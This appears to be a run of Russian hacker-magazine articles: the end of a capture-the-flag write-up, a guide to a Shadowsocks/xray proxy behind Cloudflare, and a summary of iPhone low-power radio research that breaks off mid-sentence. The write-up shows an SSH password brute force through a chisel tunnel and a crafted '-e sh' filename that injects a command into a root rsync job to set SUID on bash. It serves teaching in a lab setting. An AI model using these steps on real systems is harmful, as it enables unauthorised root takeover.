                             Результат команды ipconfig

Нам нужно туннелировать трафик, чтобы подключиться по SSH. Для тун‐
нелирования будем использовать chisel. Загружаем один и тот же файл
на локальный и удаленный хост. А затем активируем на локальном хосте сер‐
вер со следующими параметрами: порт (-p), опция ожидания подключения (-
-reverse) и тип прокси.


./chisel.bin server -p 5432 --reverse --socks5




                               Логи сервера chisel

Подключаемся с удаленного хоста. Указываем адрес и порт сервера, а также
правила ретрансляции трафика: с удаленного порта 2222 на порт 22 хос‐
та 10.11.12.13.


./chisel.bin client 10.10.14.60:5432 R:2222:10.11.12.13:22




                               Логи клиента chisel

В логах серверной части должна появиться информация о подключении
и создании новой сессии.





                               Логи сервера chisel

Теперь весь трафик с порта 2222 нашего локального хоста будет ретрансли‐
рован на порт 22 хоста 10.11.12.13. Выполним подбор пароля с помощью
CrackMapExec.


crackmapexec ssh 127.0.0.1 --port 2222 -u editor -p passwords.txt





                              Результат брута паролей

И один из паролей подошел, поэтому мы можем авторизоваться на хосте
и получить стабильную сессию.


ssh -p2222 editor@127.0.0.1





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Осматриваемся на хосте и находим исполняемый файл cron.sh.x.



                          Разрешения файла

Запустим файл под ltrace, чтобы посмотреть функции, которые он исполь‐
зует.





                              Трассировка файла

Видим несколько вызовов функции exec. Это значит, что файл выполняет
в консоли еще какие‑то команды. Чтобы узнать какие, используем pspy64.





                                   Логи pspy64

В логах pspy видим запуск mysqldump, tar, gzip и других утилит. Среди них
есть и rsync, для которой существует техника GTFOBins.
  В команду rsync будут вставлены все файлы из каталога /backup, но, если
мы можем  использовать  «ненормальное»  имя  файла  -e  test.test,
при вставке этой строки в команду rsync она будет восприниматься не как имя
файла, а как параметр -e и его значение test.test, что приведет к выпол‐
нению  файла test.test. Таким способом передадим для выполнения
скрипт, который назначит бит SUID на файл командной оболочки /bin/bash,
чтобы мы могли его запустить от имени пользователя root.


echo "chmod u+sx /bin/bash" > ralf.expl
chmod +x ralf.expl
touch -- "-e sh ralf.expl"

Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Где‑то спустя три минуты (период бэкапа понятен благодаря именам файлов)
проверяем разрешения /bin/bash.




                      Разрешения файла /bin/bash

S-бит выставлен, поэтому запускаем новую оболочку в контексте root.





                           Флаг рута

Флаг рута у нас в руках, и машина захвачена!
ПРИВАТНОСТЬ

НЕПРИСТУПНЫЙ
 VPS

    СТРОИМ ЗАЩИЩЕННЫЙ КАНАЛ
        С ВНЕШНИМ МИРОМ





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com





В нашем полном опасностей, чрезвычайно жестоком мире
нужно уметь защищать свою жизнь,  имущество, трафик
и драгоценные фоточки с котиками. В этой статье я расска‐
жу, как  настроить защищенный канал  связи с внешним
миром, который будет сложно отличить от обычного HTTPS-
трафика и, следовательно, заблокировать или расшифро‐
вать.  Колдунствовать  мы  будем  с  помощью  прокси
Shadowsocks с плагином xray. Все ПО находится в актуаль‐
ном состоянии и постоянно обновляется.


           WARNING

                         Информация    предоставлена    исключительно
                       для  ознакомительных и  академических целей.
                       Автор просит соблюдать законодательство той
                           страны, на территории которой ты находишься!


Кто может интересоваться твоими сетевыми соединениями? Да кто угодно!
От хакерских группировок до злобных админов, которые любят шейпить раз‐
ные типы трафика (например, наши любимые торренты). Да и просто иногда
требуется сменить IP (например, чтобы посмотреть зарубежную новинку
в онлайн‑кинотеатре).
   Итак, перед настройкой софта нам придется заняться необходимыми под‐
готовительными работами:
 • купить VPS;
 • купить доменное имя;
 • зарегистрироваться на Cloudflare и выполнить необходимую настройку.

Разберем по порядку.


VPS
Чтобы свести риски к минимуму, необходимо выбирать хостера VPS дос‐
таточно дотошно — обращай внимание на то, в каком государстве зарегис‐
трировано юридическое лицо, в каких странах физически расположены сер‐
веры. Предпочтение следует отдавать тем, где законодательство строго
относится к личной информации (например, Швейцария или Исландия).
Это касается как места регистрации юридического лица, так и физического
нахождения серверов.
   Кроме того, не следует забывать про «альянс 14 глаз» (Австралия, Бель‐
гия, Великобритания, Германия, Дания, Испания, Италия, Канада, Нидер‐
ланды, Новая Зеландия, Норвегия, США, Франция, Швеция) — это страны,
которые свободно обмениваются разведданными друг с другом (законо‐
дательство у них соответствующее). Если твои данные попали в руки одной
страны из этого списка, можно считать, что остальные тоже их получили.
   Кроме того, есть страны, которые так или иначе сотрудничают с альянсом:
Южная Корея,  Япония,  Израиль,  Сингапур. Это на  уровне  слухов,  но,
как известно, дыма без огня не бывает. Можно много говорить о том, что кон‐
кретно ты им не нужен, что у них и без тебя забот полно, — тут каждый решает
для себя, что ему важнее. Например, автор эти страны сразу вычеркнул
из списка кандидатов. Итак, VPS купили, идем дальше.


ДОМЕННОЕ ИМЯ
Здесь нет никаких особых требований, хочу только отметить, что часто хос‐
тинги VPS заодно торгуют и доменными именами. На мой взгляд, более секь‐
юрно использовать возможности того же хостинга VPS, чем обращаться
в другую компанию и там по второму кругу светить свои данные. В этой статье
мы будем использовать некий абстрактный домен secret-site.com. Идем
дальше.


             INFO

                         Почему не следует использовать ESNI/ECH? Все
                       очень просто: если некоторые сетевые фильтры
                      не могут определить сайт назначения, то они
                           просто блокируют соединение.



CLOUDFLARE
Cloudflare в нашей цепочке играет роль защитного механизма: мы скрываем
настоящий IP нашего VPS и защищаем его от некоторых видов атак. Трафик
от нашего компа будет идти сначала в сеть Cloudflare и только из нее —
к нашему VPS. Кроме того, Cloudflare сгенерирует сертификат для TLS-соеди‐
нения, и весь трафик на всем пути следования будет завернут в TLS 1.3.
  Для начала нам нужно пройти регистрацию и привязать к сервису куп‐
ленный домен. Далее на вкладке DNS нужно заполнить строки А (две штуки),
в которые мы вводим наш домен (в одну строку с приставкой www, в другую
без нее) и IP нашего VPS.





                           Заполнение записей А

После этого необходимо ввести показанные нам серверы имен Cloudflare
в панель управления нашего доменного регистратора на вкладке DNS.





                        Серверы имен Cloudflare

Далее на вкладке SSL/TLS:
 • выбираем шифрование Full (strict);
 • включаем Always Use HTTPS;
 • включаем TLS 1.3;
 • устанавливаем Minimum TLS Version на 1.3;
 • включаем Opportunistic Encryption;
 • включаем Automatic HTTPS Rewrites.





              Включаем шифрование соединения на полную!

Уф‑ф, немного укрепили TLS, можно двигаться дальше. Теперь идем в Client
Certificates на той же вкладке и жмем кнопку Create Certificate для генерации
сертификата и ключа (условимся, что файлы будут называться secret-site.
pem и secret-site.key).
   Теперь идем на VPS и приступаем к настройке.


НАСТРОЙКА VPS
Итак, в некоторой степени утомительная подготовительная процедура окон‐
чена, давай теперь настраивать сам VPS. Все настройки будут делаться
на Debian 11 x64.
   Сначала обновим пакеты и установим вспомогательные утилиты:


apt update && apt upgrade -y
apt install -y dnsutils nethogs vnstat sendmail fail2ban nano wget
unzip htop psmisc nginx

Теперь разберемся с сертификатами и ключами от Cloudflare — их мы
положим на наш VPS в папку /etc/ssl/ и выдадим ей права только на чтение.
   Далее надо сгенерировать параметр Диффи — Хеллмана:


openssl dhparam -out /etc/ssl/dh-param.pem 4096

Положим его в ту же папку /etc/ssl/.
   Теперь приступим к настройкам Nginx в файле /etc/nginx/nginx.conf —
в его стандартную структуру достаточно добавить наш сертификат, ключ, DH
и некоторые служебные настройки:


server{
  listen 443 ssl http2 reuseport backlog=131072 fastopen =256;


  ssl_certificate /etc/ssl/secret-site .pem;
  ssl_certificate_key /etc/ssl/secret-site .key;
  ssl_dhparam /etc/ssl/dh -param .pem


  ssl_protocols TLSv1 .3 ;
  ssl_ecdh_curve secp384r1 ;


  add_header X -Robots-Tag "noindex, nofollow" always;
  add_header X -Content-Type -Options "nosniff" always;
  add_header X -Xss-Protection "1; mode=block" always;


  add_header Strict-Transport -Security 'max-age=63072000;
includeSubdomains; preload' always;


  resolver localhost valid =300s ;
  ssl_buffer_size 8k ;
  ssl_prefer_server_ciphers off;

Далее добавим локации:


  location / {
    limit_req zone =one burst =5 nodelay;


    index  index .html index .htm;


    limit_rate 19k ;
    set $limit_rate 19K ;
    proxy_redirect off;
  }


  location /secretline {
    proxy_redirect off;
    proxy_buffering off;
    proxy_http_version 1 .1 ;


    proxy_pass http ://localhost :8008 /;


    proxy_set_header Host $http_host ;
    proxy_set_header Upgrade $http_upgrade ;
    proxy_set_header Early -Data $ssl_early_data;
    proxy_set_header Connection "upgrade" ;
  }

В location / я вписал index.html — это просто сайт‑заглушка, который
будет болтаться на нашем серваке для того, чтобы противостоять активному
зондированию. Проще говоря, если какой‑то зонд будет сканировать сервер
в поисках Shadowsocks или чего‑то еще, он просто увидит нашу заглушку.
Тогда он подумает, что это обычный сайт, оставит нас в покое и уйдет пить
пиво.
   Локация location /secretline — это и есть наш Shadowsocks. Вместо
строки secretline нужно придумать что‑то более оригинальное и труд‐
ноподбираемое, эта строка будет передаваться в качестве параметра на кли‐
енте к плагину xray.
   Далее скачиваем и устанавливаем Shadowsocks и xray-plugin:


wget https://github.com/shadowsocks/shadowsocks-rust/releases/
download/v1.14.3/shadowsocks-v1.14.3.x86_64 unknown-linux-gnu.tar.xz
&&
tar -xf shadowsocks-v1.14.3.x86_64-unknown-linux-gnu.tar.xz


wget https://github.com/teddysun/xray-plugin/releases/download/v1.5.
4/xray-plugin-linux-amd64-v1.5.5.tar.gz &&
tar -xf xray-plugin-linux-amd64-v1.5.5.tar.gz

Создаем папку shadowsocks и копируем в нее нужные файлы:


mv ssserver /bin
mv xray-plugin /etc/shadowsocks/xray-plugin

Настраиваем разрешения:


setcap 'cap_net_bind_service=+eip' /etc/shadowsocks/xray-plugin
setcap 'cap_net_bind_service=+eip' /bin/ssserver

Теперь создадим файл конфигурации сервера Shadowsocks:


touch /etc/shadowsocks/shadowsocks-rust.json
nano /etc/shadowsocks/shadowsocks-rust.json

И запишем туда такой текст:


{
  "server":["127.0.0.1"],
  "server_port":8008,
  "password":"Password123",
  "timeout":300,
  "method":"chacha20-ietf-poly1305",
  "fast_open":true,
  "reuse_port":true,
  "plugin":"/etc/shadowsocks/xray-plugin",
  "plugin_opts":"server;loglevel=none",
  "nameserver":"1.1.1.1",
  "mode": "tcp_and_udp",
  "no_delay": true,
  "workers":1
}

Давай пройдемся по основным пунктам:
 • "server_port" — порт, на котором будет висеть сервер shadowsocks;
 • "workers" — количество ядер на сервере;
 • "ipv6_first" — поддержка протокола IPv6;
 • "nameserver" — IP DNS-сервера, если есть локальный, то 127.0.0.1;
 • "plugin" и "plugin_opts" используются для плагина xray;
 • "reuse_port" — оптимизация для более быстрого использования сети;
 • "method" — используемое шифрование;
 • "password" — пароль для подключения к серверу.

Теперь создадим сервис ss-xray.service:


nano /etc/systemd/system/ss-xray.service

Записываем туда следующий текст:


[Unit]


Description=Shadowsocks with XRAY
After=network.target


[Service]


Type=simple
User=nobody
Group=nogroup
LimitNOFILE=51200
ExecStart=/bin/ssserver -c /etc/shadowsocks/shadowsocks-rust.json
ExecStop=/bin/killall ssserver
Restart=always
RestartSec=10


[Install]


WantedBy=multi-user.target

Сохраняемся и выходим: Ctrl + O, Ctrl + X. Включаем сервис:


sysctl -p && systemctl enable ss-xray.service

С основной настройкой мы закончили, теперь можно немного оптимизи‐
ровать сетевой стек. В файл /etc/sysctl.conf дописываем следующее:


fs.file-max = 131072
net.core.rmem_max = 8388608
net.core.wmem_max = 8388608
net.core.rmem_default = 8388608
net.core.wmem_default = 8388608
net.core.optmem_max = 8388608
net.core.netdev_max_backlog = 131072
net.core.somaxconn = 131072
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.tcp_mem = 25600 51200 102400
net.ipv4.tcp_rmem = 4096 1048576 4194304
net.ipv4.tcp_wmem = 4096 1048576 4194304
net.ipv4.tcp_fastopen=3
net.ipv4.tcp_low_latency = 1
net.ipv4.tcp_no_metrics_save = 1
net.ipv4.tcp_adv_win_scale = 1
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_keepalive_time = 150
net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_keepalive_intvl = 30
net.ipv4.tcp_synack_retries = 1
net.ipv4.tcp_slow_start_after_idle=0
net.ipv4.tcp_max_syn_backlog = 65536
net.ipv4.tcp_max_tw_buckets = 720000
net.ipv4.tcp_mtu_probing = 1

Опять сохраняемся и перезагружаем сервер. Теперь все должно работать.
   Что в итоге у нас получилось? Запрос от нашего компа уходит в CDN
Cloudflare, а возвращается от нашего VPS. Для внешнего наблюдателя соз‐
дается впечатление, будто комп общается по TLS с каким‑то сайтом, но что
передает — узнать не получится, ибо шифрование. Другими словами, наб‐
людается обычная сетевая активность, чего мы и хотели добиться.
  В качестве клиентов к серваку можно смело юзать:
 • SagerNet для Android;
 • Shadowsocks-windows для винды;
 • ShadowsocksX-NG для macOS.

Как еще можно укрепить наш VPS? Например, так:
 • сменить порт SSH для того, чтобы автоматические сканеры не ломились
   на стандартный порт;
 • настроить Fail2ban, чтобы ограничить количество попыток ввести неп‐
   равильный пароль для входа на сервер;
 • вместо прямого обращения к DNS-серверу можно настроить локальный
   сервер, который связывается с внешним миром при помощи DoH или DoT,
   чтобы даже хостер VPS не знал, какие DNS-запросы ты шлешь;
 • настроить учет трафика, чтобы не получить внезапный счет от хостера
   (если трафик у него лимитирован).

Одним словом, включай фантазию и обустраивай свой неприступный VPS!
ПРИВАТНОСТЬ
  НЕСПЯЩИЙ
    IPHONE





       КАК ВЫКЛЮЧЕННЫЙ IPHONE
МОЖЕТ ШПИОНИТЬ ЗА СВОИМ ВЛАДЕЛЬЦЕМ




Когда iPhone отключен, большинство его
беспроводных     чипов      продолжают
функционировать. На  новейших моделях
iPhone при отсутствии питания работают
Bluetooth, коммуникация NFC и беспровод‐         Олег Сивченко                                                                                               adrelian@gmail.com
ная связь на базе технологии UWB. Этой
особенностью трубок Apple может восполь‐
зоваться не  только  владелец  телефона,
но и  злоумышленники. Как? Давай  раз‐
бираться.


 Специалисты из германской лаборатории Secure Mobile Networking Lab опуб‐
 ликовали большое исследование с громким заголовком, гласящим, что
 в iPhone могут завестись вредоносы, которые остаются активными даже пос‐
 ле выключения питания девайса. Однако если вдумчиво прочитать все один‐
 надцать  страниц  доклада,  выяснится, что такие  вредоносы  существуют
 исключительно в воспаленном воображении этих самых германских иссле‐
 дователей. На самом деле речь идет о том, что в мобильных устройствах
под управлением iOS имеется несколько чипов, продолжающих работать,
даже когда питание телефона отсутствует. Так, при выключении iPhone поль‐
 зователь все равно можно найти его с помощью функции Find My Phone. Если
 батарея разрядится, то iPhone выключится автоматически и перейдет в энер‐
 госберегающий режим, но в таком случае все равно сохраняется доступ
 к кредитным картам и другим объектам из приложения Wallet. Эти возможнос‐
 ти могут превратить выключенный телефон в устройство для слежки за поль‐
 зователем.
    Беспроводные чипы в iPhone могут работать в так называемом режиме
 низкого энергопотребления (Low Power Mode, LPM). Обрати внимание: LPM
не тождественен энергосберегающему режиму, который обозначается икон‐
 кой «желтая батарея». В режиме LPM устройство не реагирует на нажатия
или встряхивание. Этот режим активируется либо когда пользователь вык‐
 лючает телефон, либо когда iOS завершает работу автоматически из‑за низ‐
 кого заряда батареи. Если нажать кнопку включения в экономном режиме
 с низким энергопотреблением, то экран активируется всего на несколько
 секунд. Устройство сообщит о низком заряде аккумулятора и выведет список
 активных в данный момент возможностей LPM, как показано на следующем
 рисунке.





            Find My и Express Cards в энергосберегающем режиме

Сеть Find My Phone остается доступна после выключения устройства. Если ты
 потеряешь iPhone, когда он разряжен, как раз с помощью этой сети его
и можно найти — она работает на основе Bluetooth. Режим Express Mode под‐
 держивает выбранные проездные билеты, а также кредитные карты и циф‐
ровые ключи из «Кошелька» — так устройство удается задействовать быс‐
 трее, дополнительная аутентификация со стороны пользователя не требует‐
 ся. При отключении из‑за низкого заряда батареи эти карты и ключи остаются
 доступны для использования на протяжении пяти часов. Исходно для под‐
 держания устройства во включенном виде со всеми этими возможностями
 требовалась только NFC. Теперь же появился новый протокол DCK 3.0,
 использующий режимы Bluetooth и UWB, а также поддерживающий режим
 Express Mode. Этот протокол используется в конструкции электронных авто‐
 мобильных ключей, а режим Express Mode предохраняет от неприятностей
 из разряда «захлопнул ключи в машине или в квартире». Еще он оставляет
 в распоряжении пользователя его карты, чтобы можно было выполнять пла‐
 тежи, даже если телефон сел.


КАК ЭТО РАБОТАЕТ?
 Поддержка LPM реализована на аппаратном уровне. Модуль управления
 питанием PMU может включать чипы поодиночке. Чипы для Bluetooth и UWB
 жестко подключены к защищенному элементу (SE) чипа NFC и хранят сек‐
 реты, которые должны быть доступны в режиме LPM. Поскольку LPM под‐
 держивается на аппаратном уровне, эту поддержку нельзя убрать, меняя
 программные компоненты. Именно поэтому владелец современного айфона
уже не может быть уверенным, что чипы для беспроводной связи отключатся
 после выключения устройства.
   LPM  значительно  коварнее,  чем  имитация  выключения  девайса,
при которой просто деактивируется экран. Вспоминается  случай,  когда
 Агентство национальной безопасности США имитировало выключение экра‐
на на умном телевизоре в целях шпионажа. На айфоне при этом будет
заметен быстрый расход батареи, и такая «подсадка» в мобильное устрой‐
 ство не останется незамеченной.
    Возможности Bluetooth и UWB в режиме LPM не документированы и до
 недавнего времени не исследовались. Но в руководстве по безопасности
 для платформы Apple подробно описана относящаяся к NFC LPM воз‐
можность под названием Express Card, появившаяся в iOS 12. В своей работе
 германские исследователи использовали инструменты для анализа и изме‐
нения  прошивки  в  современных  айфонах,  доступные  для  скачивания
 в репозиториях InternalBlue и Frankenstein. С помощью этих программ они
 выяснили, что в энергосберегающем режиме айфоны не столь безопасны,
 как это кажется со стороны.
   iOS реализует безопасные беспроводные платежи на NFC-чипе с при‐
 менением технологии Secure Element (SE). Эта технология работает на плат‐
форме JavaCard, которая выполняет апплеты, например Apple Pay или DCK.
В ходе начальной установки апплеты персонализируются. Персонализация
 позволяет дополнительно разграничивать зоны безопасности. Например,
 в платежном апплете не хранится никакой информации о кредитных картах,
 кроме отзывного идентификатора,  известного платежной сети. Апплеты,
 в том числе их секреты, отделены друг от друга. Они хранятся в SE и не
 покидают ее. В процессе платежа или при беспроводных транзакциях среда
SE в составе чипа NFC откликается напрямую, не переадресуя эти данные
 в iOS. Следовательно, даже если iOS или приложения скомпрометированы,
 кредитные карты и другие ключи невозможно украсть из SE.





   Использование безопасной среды (SE) и процессора Secure Enclave
   Processor (SEP) в соответствии с документацией Apple

 Среда SE подключена к процессору Secure Enclave Processor (SEP). Процес‐
сор SEP авторизует платежи, обеспечивая аутентификацию пользователя
 через Touch ID, Face ID или c помощью пин‑кода. Обрати внимание: SEP
не хранит данные в SE, а использует отдельный безопасный компонент‑хра‐
 нилище. SE и SEP объединяются в пару, следовательно, коммуникация между
ними может шифроваться и аутентифицироваться.


ЭКСПРЕСС-КАРТЫ И FIND MY
 Приложение  Wallet («Кошелек»)  позволяет конфигурировать работающие
по NFC кредитные, дисконтные карты и проездные билеты, а также ключи
 для режима Express Mode. Экспресс‑карта больше не требует авторизации
по SEP, обеспечивая таким образом быстрые и удобные платежи без разбло‐
 кировки iPhone. В экспресс‑режиме, чтобы пройти авторизацию, достаточно
лишь владеть самим телефоном. Если авторизацию пропустить, ни SEP,
ни iOS не потребуются для завершения транзакции по NFC, а сама ком‐
 муникация сможет работать автономно, при помощи апплетов SE.
   Как только у iPhone закончится заряд, при условии, что у пользователя
 есть экспресс‑карта, iPhone выключится, но чип NFC останется запитан
на протяжении пяти часов. В этот период экспресс‑карты будут работать,
но при выключении устройства по инициативе пользователя NFС также
 отключается.
   В iOS 15 появились две новые возможности, доступные в режиме низкого
 энергопотребления: Find My Phone,  собственная сеть Apple на основе
 Bluetooth с низким энергопотреблением (BLE), работающая офлайн и пред‐
 назначенная для поиска потерянных устройств, и поддержка цифрового авто‐
 мобильного ключа (Digital Car Key, DCK 3.0), при которой UWB применяется
 для безопасного измерения расстояния. Следовательно, и Bluetooth, и чип
UWB могут работать автономно, пока iOS отключена. Эти возможности
не документированы и ранее не исследовались.
    Find My — это офлайновая сеть для нахождения устройств, которую авто‐
ры доклада детально исследовали, включая реверс соответствующего ПО.
Она находит iPhone, AirTag и другие устройства Apple, даже когда они не под‐
 ключены к интернету. Если девайс не в сети, в режиме пропажи он регулярно
шлет широковещательные BLE-оповещения. Подключенные к сети устрой‐
 ства, расположенные  поблизости, ловят такие оповещения и сообщают
 законному владельцу, где находится его «потеряшка».
    Протокол Find My защищен сквозным шифрованием, анонимен и работает
 с сохранением конфиденциальности. Эти гарантии безопасности основаны
на девайс‑специфичном «маячковом» мастер‑ключе, который синхронизи‐
 руется с цепочкой ключей из пользовательского iCloud. Поэтому доступ сох‐
 раняется до тех пор, пока пользователь в состоянии залогиниться в iCloud.
    Цепочка ключей также хранится локально, а для доступа к ее секретному
 ключу требуется пройти полный путь через SEP. На мастер‑ключе маячка
 генерируется  оборачивающаяся   последовательность  пар,  в  каждую
 из которых входит открытый и закрытый ключ. Эта последовательность зафик‐
 сирована навечно, и каждый ключ действителен только в свой промежуток
 времени. Чтобы связать открытые ключи в этой последовательности друг
 с другом, требуется знать маячковый мастер‑ключ. Устройство широковеща‐
 тельно сообщает актуальный публичный ключ в виде BLE-объявления, а часть
 этого ключа также устанавливает MAC-адрес случайным образом. Любое
 устройство, подключенное к интернету и наблюдающее BLE-объявление сети
 Find My, может зашифровать свое нынешнее примерное местонахождение
 открытым ключом и сообщить его Apple. Только у законного владельца
 потерянного устройства, которое пока находится офлайн, имеется под‐
ходящий закрытый ключ, чтобы расшифровать отчет о местоположении.
По отчету о местоположении невозможно идентифицировать сообщившего.
 Цепочка открытых ключей на iPhone полностью проматывается за 15 мин, что
 ограничивает возможность отследить смартфон по его BLE-объявлениям.
 Метки AirTag функционально подобны сети Find My. Потеряв соединение
по Bluetooth с iPhone владельца, они начинают рассылать широковещатель‐
ные сообщения, которые принимаются другими  подключенными  к сети
 устройствами.
    Работа  сети  Find My  поддерживается  после  отключения  питания,
и информация об этом выводится в диалоговом окне завершения работы.
 Пользователь может изменить эту настройку всякий раз, когда выключает
 устройство вручную. Если на iPhone полностью израсходуется батарея и он
 перейдет на резервный источник питания, сеть Find My активируется авто‐
 матически, подобно экспресс‑картам на NFC-чипе. Для поддержки режима
LPM требуется прошивка Bluetooth, которая может рассылать BLE-сооб‐
щения, когда iOS отключится.





           Диалоговое окно завершения для сети Find My на iOS 15

 Чипы Broadcom Bluetooth могут конфигурироваться либо для взаимодействия
 с хостом, например iOS, либо для работы в качестве автономных приложе‐
 ний, например на IoT-устройствах. При переходе в режим LPM работа стека
iOS Bluetooth завершается и настройки чипа Bluetooth сбрасываются. Затем
 множество команд интерфейса хост‑контроллера конфигурируют параметры
 сети Find My. Последняя команда отключает HCI, тем самым останавливая
 всякую коммуникацию с iOS. Прошивка запускает автономный поток широко‐
 вещательных сообщений  Find My. Модулю управления питанием (PMU)
 рекомендуется держать чип Bluetooth включенным, несмотря на отключение
 iOS.
    Команды конфигурации HCI для сети Find My позволяют задавать множес‐
 твенные открытые ключи в расчете на краткий и долгий интервал ротации.
 Длительность  интервала  и общее  количество  ключей —  переменные
 параметры. В iOS 15.3 устанавливается 96 ключей на короткий интервал
 (15 мин) и 0 ключей на долгий интервал (24 ч). Следовательно, автономное
 приложение, работающее по Bluetooth, может отправлять широковещатель‐
ные сообщения Find My в течение не более 24 ч.


«АВТОМОБИЛЬНЫЕ» КЛЮЧИ DCK 3.0
 Наряду с NFC-картами iOS также поддерживает «автомобильные» ключи
 (Digital Car Key, DCK 3.0). Их используют службы каршеринга, а также при‐
 ложения, позволяющие управлять с телефона современными «цифровыми»
 автомобилями — дистанционно запускать двигатель, включать режим охраны,
 открывать со смартфона двери и багажник, задействовать иммобилайзер.
Еще DCK позволяет устанавливать скоростной лимит для молодых водителей,
а также совместно использовать такой ключ через iCloud.
   Несмотря на удобство DCK с точки зрения пользователя, эта технология
 привносит новые векторы атак. Со стороны реализации основные риски
 несут автопроизводители. Скомпрометированный DCK или изъяны в его
 реализации могут быть использованы для угона машины, но не для кражи
 iPhone. Угон реальной машины — это не цифровой платеж, его не отменишь.
 Такие риски и побудили автопроизводителей перейти с DCK 2.0 (основанных
на NFC) на DCK 3.0.
    Аббревиатура NFC (коммуникация ближнего поля)  подсказывает, что
успешные транзакции могут проходить только между двумя устройствами,
 находящимися рядом, NFC и  другие  сравнительно  старые  технологии
 для автомобильных ключей подвержены эстафетным атакам. При эстафетных
 атаках сигналы предаются на большие расстояния, чем задумано. Это серь‐
 езная угроза, поскольку эстафетная атака открывает доступ к машине, когда
ее владельца поблизости нет. Короткие дистанции можно преодолеть, уси‐
 ливая имеющийся сигнал. На длинных дистанциях сигнал требуется декоди‐
 ровать в пакеты и уже их переадресовывать с устройства на устройство. Пер‐
вый практичный и недорогой инструмент для эстафетных атак на основе NFC
был описан в 2011 году, и до сих пор поддерживаются аналогичные инстру‐
 менты, рассчитанные на новейшие NFC-технологии.
    Тогда как спецификация DCK 2.0 основана на NFC, в DCK 3.0 добавлен
 контроль безопасного расстояния (secure ranging) на основе UWB. Хотя UWB
и рекламировалась как технология, поддерживающая контроль безопасного
 расстояния, ее фундаментальные измерительные параметры неидеальны.
На практике уже продемонстрированы дешевые атаки по сокращению рас‐
 стояния, направленные на UWB-чип Apple (на дистанции до 12 м).
    Протокол DCK 3.0 использует как BLE, так и UWB. BLE обеспечивает пер‐
 вичное соединение и аутентификацию. Затем UWB применяется для точеч‐
 ного измерения расстояния (fine ranging) с защитой симметричным ключом,
но без передачи данных. Следовательно, как BLE, так и UWB требуют доступа
 к секретному ключу. Спецификация DCK 3.0, пошагово описывающая работу
 протоколов BLE и UWB, доступна исключительно членам Car Connectivity
 Consortium.
   Apple стала использовать аппаратные компоненты для DCK 3.0 с версии
 iPhone 11. На айфонах с поддержкой DCK 3.0 безопасная среда (SE) жестко
 вшита в чипы Bluetooth и UWB. Следовательно, аналогично использующим SE
 NFC-транзакциям, генерируемые SE отклики передаются непосредственно
 в эфир, без совместного использования в iOS. Модели айфонов, оборудо‐
 ванные чипами Bluetooth и UWB с поддержкой низкого энергопотребления
 (LPM), перечислены в следующей таблице.





         Беспроводные чипы, активно использующие поддержку LPM


НЕДОСТАТКИ FIND MY PHONE
На уровне приложения исследователи исходили из того, что злоумышленник
не манипулировал прошивкой или ПО на iPhone. Напротив, атакующие пыта‐
ются скомпрометировать или использовать возможности LPM — например,
 отключить сеть Find My Phone для кражи iPhone или воспользоваться экс‐
 пресс‑картами для кражи денег.
   На примере сети Find My Phone было обнаружено, что телефон прекраща‐
 ет посылать широковещательные сообщения гораздо раньше, чем ожи‐
 далось, а во многих случаях не рассылает их вообще. При завершении
работы по инициативе пользователя система создает всего 96 таких сооб‐
щений, которые рассылаются с интервалом в 15 мин. Через 24 ч будут
 переданы все сообщения. Это не разъясняется пользователю, который
может подумать, будто его потерянный iPhone можно найти в течение многих
 дней. Кроме того, сеть Find My Phone можно выключить при отключении
 питания устройства, но для  этого в iOS 15.3 и выше  придется ввести
пароль — таким образом Apple предусмотрела еще один инструмент против
 кражи.





   Запароленное диалоговое окно, в котором можно отключить сеть Find
  My при отключении питания

Сеть Find My прекращает работу до первой разблокировки айфона спус‐
 тя 24  ч. При выключении телефона сообщения,  рассчитанные на  сле‐
дующие 24 ч, дополнительно хранятся на устройстве. Даже если сеть Find My
 будет отключена принудительно, сообщения все равно кешируются. Как толь‐
 ко iPhone загрузится, он восстановит токен Find My из хранилища с энер‐
 гонезависимой памятью (NVRAM), и этот токен сохраняется от перезагрузки
 к перезагрузке. Затем токен Find My используется для дешифровки кеширо‐
 ванных сообщений, предоставляя доступ к ним демону Bluetooth перед пер‐
вой разблокировкой. По истечении 24 ч iPhone прекращает рассылать сооб‐
щения. Это не зависит от предпринятых ранее действий, iPhone мог уже
 находиться в режиме LPM или быть перезагружен напрямую. Поскольку сооб‐
щения жестко привязаны к запланированному периоду передачи, продлить
 этот период невозможно.
    Если перед первой разблокировкой у iPhone есть соединение с интерне‐
 том, то он подключится к серверам Apple и сообщит свое местоположение.
 iPhone может оказаться офлайн перед первой разблокировкой по многим
 причинам.  Ключи  Wi-Fi  доступны  только  после  первой  разблокировки,
а сотовое соединение обрывается, если пользователь защитил SIM-карту
пин‑кодом либо SIM-карта была извлечена. Следовательно, вор может быть
 уверен, что через 24 ч функция Find My Phone будет неактивна, даже если он
 подключит iPhone к зарядному устройству, — достаточно извлечь SIM-карту
и включить телефон вне зоны действия открытых беспроводных сетей.
   Даже когда в пользовательском интерфейсе отображается сообщение,
 что функция Find My Phone активирована после отключения питания, иногда
 это не соответствует действительности. Например, в Find My Phone может
 отказать генерация сообщений. Если при отключении устройства настройка
 Find My по какой‑то причине завершится ошибкой, никаких предупреждений
об этом пользователь не получит.
    Исследователи заметили и еще один забавный момент. Если при отклю‐
чении питания iPhone по инициативе пользователя подключить устройство
 к электросети через зарядку, а потом зарядку убрать, то через пару часов
 iPhone загрузится сам. Если при отключении кабель в iPhone не вставлен, то
 автоматической загрузки устройства не произойдет. По этой причине поль‐
 зователь через какое‑то время может обнаружить, что батарея его iPhone
 полностью опустошена, хотя он телефон не включал.


ВМЕШАТЕЛЬСТВО В ПРОШИВКУ
В современных моделях iPhone поддержка LPM присутствует в чипах ком‐
 муникации NFC, UWB и Bluetooth. Злоумышленнику не требуется менять
 поведение ядра, он может воспользоваться имеющимися драйверами, чтобы
 включить LPM на этих чипах, при этом модифицировать приходится только
